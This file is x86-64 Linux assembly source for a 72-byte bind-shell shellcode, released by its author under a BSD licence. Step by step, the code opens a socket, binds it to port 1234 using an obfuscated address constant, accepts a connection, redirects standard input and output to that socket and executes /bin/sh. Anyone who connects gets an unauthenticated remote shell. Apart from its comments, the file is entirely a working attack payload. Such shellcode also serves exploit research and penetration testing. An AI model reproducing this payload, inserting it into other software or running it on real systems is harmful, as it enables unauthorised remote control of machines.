;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;

; 72 byte bind shell for linux/x86-64
; odzhan

    bits    64

    %define AMD64
    %include "include.inc"

    %ifndef BIN
      global _start
    %endif

_start:
    ; step 1, create a socket
    ; s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    push    SYS_socket
    pop     rax
    push    SOCK_STREAM
    pop     rsi
    push    AF_INET
    pop     rdi
    cdq                 ; rdx = IPPROTO_IP
    syscall

    xchg    eax, edi    ; rdi = s, rax = 2

    ; step 2, bind to port 1234
    ; bind(s, {AF_INET,1234,INADDR_ANY}, 16)
    mov     ebx, ~0xd2040002 & 0xFFFFFFFF
    not     ebx
    push    rbx
    push    rsp
    pop     rsi         ; rsi = &sa
    mov     dl, 16      ; rdx = sizeof(sa)
    mov     al, SYS_bind
    syscall

    ; step 3, listen
    ; listen(s, 0);
    xor     esi, esi    ; rsi = 0
    mov     al, SYS_listen
    syscall

    ; step 4, accept connections
    ; accept(s, 0, 0);
    mov     al, SYS_accept
    syscall

    xchg    eax, edi    ; edi = r, eax = 0
    push    2           ; rsi = 2
    pop     rsi

    ; step 5, assign socket handle to stdin,stdout,stderr
    ; dup2 (r, STDIN_FILENO)
    ; dup2 (r, STDOUT_FILENO)
    ; dup2 (r, STDERR_FILENO)
c_dup:
    mov     al, SYS_dup2
    syscall
    sub     esi, 1
    jns     c_dup       ; jump if not signed

    ; step 6, execute /bin/sh
    ; execve("/bin//sh", NULL, NULL);
    xor     esi, esi         ; rsi = 0
    push    rax              ; zero terminator
    mov     rcx, '/bin//sh'
    push    rcx
    push    rsp
    pop     rdi
    cdq                      ; rdx = 0
    mov     al, SYS_execve
    syscall
